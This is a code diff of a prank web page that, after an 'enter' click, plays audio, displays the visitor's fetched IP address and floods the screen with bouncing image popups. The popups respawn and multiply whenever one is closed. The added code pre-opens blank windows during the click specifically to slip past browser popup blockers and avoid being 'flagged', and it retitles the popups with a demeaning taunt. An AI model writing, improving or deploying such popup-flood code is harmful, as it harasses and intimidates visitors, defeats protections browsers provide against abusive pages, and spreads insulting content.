@@ -138,7 +138,7 @@
       <div id="status">Ready.</div>
     </div>
   </div>
-
+  <!-- All JS in one place -->
   <script>
     /***********************************************************
      * UI helpers: IP fetch, typewriter text, audio play, enter
@@ -170,9 +170,11 @@
         typeOutText('???', ipTextEl, 120);
       }
     }
+    // Ensure audio play attempt happens on user gesture
     function tryPlayAudio() {
       audioEl.play().catch(()=>{ /* ignored */ });
     }
+    // Title typing animation (small fun loop)
     (function startTitleTyping(){
       const base = '@';
       const text = ' Q u i e t';
@@ -186,26 +188,34 @@
 
     /***********************************************************
      * Pre-open pool to reduce popup-blocker UI
+     * --- ADDED: preopenPool + preOpenWindows() ---
      ***********************************************************/
     const preopenPool = [];
     function preOpenWindows(n = 6) {
       for (let i = 0; i < n; i++) {
         try {
-          // Open about:blank windows during user gesture — usually allowed
+          // Use about:blank so it's same-origin and writable
           const w = window.open('about:blank', '_blank');
-          if (w) preopenPool.push(w);
-        } catch (e) { /* ignore */ }
+          if (w) {
+            // mark it as "reserved" (we'll write to it later)
+            preopenPool.push(w);
+          }
+        } catch (e) {
+          // ignore; if blocked, pool remains small
+        }
       }
     }
 
     /***********************************************************
-     * Bouncing/popups logic
+     * Bouncing/popups logic (merged from second script)
      ***********************************************************/
     const POPUP_WIDTH = 460;
     const POPUP_HEIGHT = 580;
     const VELOCITY = 7;
+    const TICK_MS = 28;
     const MARGIN = 50;
     const TOP_MARGIN = 80;
+    // sample image pool (you can edit/expand)
     const imagePool = [
       "https://i.redd.it/d1vg3bkqbsgg1.jpeg",
       "https://i.redd.it/6j3kd2babsgg1.jpeg",
@@ -223,6 +233,7 @@
       "https://i.redd.it/90ywzxmcqrgg1.jpeg",
       "https://i.redd.it/uhehj9hkprgg1.jpeg",
       "https://i.redd.it/nvyo12mpnrgg1.jpeg",
+      // placeholders allowed — add real ones if needed
     ];
     const activePopups = new Set();
     function openPopupBlank(title = "IDIOT.exe") {
@@ -230,19 +241,26 @@
       const top = Math.max(10, (screen.availHeight - POPUP_HEIGHT) / 2 + ((Math.random()*180 - 90)|0));
       const features = `width=${POPUP_WIDTH},height=${POPUP_HEIGHT},left=${left},top=${top},resizable=yes,scrollbars=no,status=no,toolbar=no,menubar=no,location=no`;
       const win = window.open('', '_blank', features);
-      if (!win) return null;
+      if (!win) {
+        // user likely blocked fresh popups
+        return null;
+      }
       return win;
     }
 
     function spawnBouncingWindow() {
-      if (!imagePool.length) return;
+      if (!imagePool.length) {
+        console.warn('No images in pool');
+        return;
+      }
       const imgUrl = imagePool[Math.floor(Math.random() * imagePool.length)];
       const html = `<!doctype html>
-      <html><head><meta charset="utf-8"><title>IDIOT.EXE</title>
+      <html><head><meta charset="utf-8"><title>You Gay Af</title>
       <style>html,body{margin:0;height:100%;background:#000;}img{width:100%;height:100%;object-fit:contain;}</style>
       </head><body>
         <img src="${imgUrl}" alt="image" />
         <script>
+          // inform opener when this child unloads
           try {
             addEventListener('beforeunload', function() {
               try { opener && opener.postMessage({type:'child_closing'}, '*'); } catch(e){}
@@ -251,28 +269,38 @@
         <\/script>
       </body></html>`;
 
-      // reuse pre-opened window if available
+      // Try to reuse a window from the pre-open pool first (avoids blocker)
       let win = null;
       while (preopenPool.length) {
         const candidate = preopenPool.pop();
         try {
+          // if the candidate was closed, skip it
           if (!candidate || candidate.closed) continue;
           win = candidate;
           break;
-        } catch (e) { continue; }
+        } catch (e) {
+          // accessing .closed might fail in rare cases, skip candidate
+          continue;
+        }
       }
 
+      // If no pre-opened window, fall back to opening a fresh one (may be blocked)
       if (!win) {
         win = openPopupBlank('Bouncing');
-        if (!win) return; // blocked
+        if (!win) {
+          // fresh open was blocked; nothing else to do
+          return;
+        }
       }
 
       try {
+        // same-origin or about:blank => safe to write
         win.document.open();
         win.document.write(html);
         win.document.close();
       } catch (e) {
-        // fallback: try fresh open
+        console.error('Failed to write to popup', e);
+        // if write fails, try a fresh open
         try {
           const fallback = openPopupBlank('Bouncing');
           if (fallback) {
@@ -280,6 +308,7 @@
             fallback.document.write(html);
             fallback.document.close();
             activePopups.add(fallback);
+            // attach monitor & bounce below
             setupPopupAfterOpen(fallback);
           }
         } catch (inner) {}
@@ -287,25 +316,32 @@
       }
 
       activePopups.add(win);
+      // attach monitor & start bouncing behavior
       setupPopupAfterOpen(win);
     }
 
+    // Factor out setup used after popup is created/written
     function setupPopupAfterOpen(win) {
-      try { win.__spawn_handled = false; } catch(e){}
+      // --- per-window monitor: spawn replacement immediately when closed ---
+      try {
+        win.__spawn_handled = false;
+      } catch (e) {}
       const monitorInterval = setInterval(() => {
         try {
           if (!win || win.closed) {
             clearInterval(monitorInterval);
             try { win.__spawn_handled = true; } catch(e){}
             activePopups.delete(win);
-            // spawn single immediate replacement
+            // immediate single replacement
             spawnBouncingWindow();
           }
         } catch (e) {
           clearInterval(monitorInterval);
           activePopups.delete(win);
         }
-      }, 300);
+      }, 350);
+
+      // start bouncing motion
       startBouncing(win);
     }
 
@@ -331,6 +367,7 @@
       tick();
     }
 
+    // If a popup closes, spawn extras (keeps your original idea)
     function watchForClosures() {
       setInterval(() => {
         let closedCount = 0;
@@ -353,8 +390,10 @@
       }, 900);
     }
 
+    // Listen for child message (child posts beforeunload)
     window.addEventListener('message', (e) => {
       if (e.data?.type === 'child_closing') {
+        // deterministic replacements to keep the pressure
         spawnBouncingWindow();
         setTimeout(spawnBouncingWindow, 200);
       }
@@ -364,26 +403,24 @@
       if (Math.random() < 0.6) spawnBouncingWindow();
     };
 
-    // small flag so we don't double-initialize initial spawns
-    let preSpawned = false;
-
+    // Start everything: multiple initial spawns + watchers
     function startBallsChaos() {
       statusEl.textContent = `Spawning chaos — popups may be blocked by your browser. Images: ${imagePool.length}`;
-      // If we already pre-spawned on entry, don't add the usual initial burst.
-      if (!preSpawned) {
-        for (let i = 0; i < 5; i++) spawnBouncingWindow();
-        setTimeout(() => {
-          for (let i = 0; i < 4; i++) spawnBouncingWindow();
-        }, 700);
-      }
+      // open several first
+      for (let i = 0; i < 5; i++) spawnBouncingWindow();
+      setTimeout(() => {
+        for (let i = 0; i < 4; i++) spawnBouncingWindow();
+      }, 700);
       watchForClosures();
+      // also allow random clicks in page to create more
       document.addEventListener('click', () => {
         if (Math.random() < 0.22) spawnBouncingWindow();
       }, true);
     }
 
     /***********************************************************
-     * The enterSite function and click handler
+     * The enterSite function: hides intro, shows main UI,
+     * triggers audio, ip fetch, and the bouncing/popups.
      ***********************************************************/
     async function enterSite() {
       tryPlayAudio();
@@ -394,31 +431,30 @@
       }, 900);
       mainContent.style.display = 'block';
       mainContent.setAttribute('aria-hidden', 'false');
+      // small UI flourish
       statusEl.textContent = 'Loading...';
+      // fetch IP and type it out
       await fetchAndDisplayIP();
+      // start chaos (popups)
       startBallsChaos();
+      // update status
       setTimeout(() => {
         statusEl.textContent = 'Good luck closing them…';
       }, 1300);
     }
 
-    // when user clicks enter: pre-open many windows and immediately fill them
+    // wire enter button (initial click) to pre-open windows and do everything
     enterBtn.addEventListener('click', (e) => {
+      // prevent double-activation
       enterBtn.style.pointerEvents = 'none';
-      // How many popups to open at once on the single enter click:
-      const MULTI_OPEN_COUNT = 12; // change this if you want more/less
-      // Pre-open blanks (user gesture) — increases chance they won't be blocked
-      preOpenWindows(MULTI_OPEN_COUNT);
-      // Immediately fill the pre-opened windows (still in user gesture)
-      for (let i = 0; i < MULTI_OPEN_COUNT; i++) {
-        spawnBouncingWindow();
-      }
-      // mark that we pre-spawned so startBallsChaos doesn't double spawn
-      preSpawned = true;
-      // continue with the rest of the flow
+      // Pre-open blank windows during the actual user click gesture.
+      // Pick a modest number (6) to reduce chance of being blocked or flagged.
+      preOpenWindows(6);
+      // now run the regular enter-site flow (which will reuse pre-opened windows)
       enterSite();
     });
 
+    // Also try a body-level click to resume audio in some browsers
     document.body.addEventListener('click', () => {
       tryPlayAudio();
     }, { once:true });
